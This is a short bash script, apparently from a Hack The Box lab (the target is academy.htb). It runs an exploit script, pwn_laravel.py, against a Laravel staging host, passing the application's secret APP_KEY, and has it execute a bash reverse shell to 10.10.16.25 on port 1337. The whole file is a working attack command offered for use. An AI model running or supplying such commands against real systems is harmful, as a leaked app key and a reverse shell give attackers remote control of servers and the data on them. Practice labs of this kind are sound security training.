#!/bin/bash

python3 pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c "bash -c 'bash -i >& /dev/tcp/10.10.16.25/1337 0>&1'"
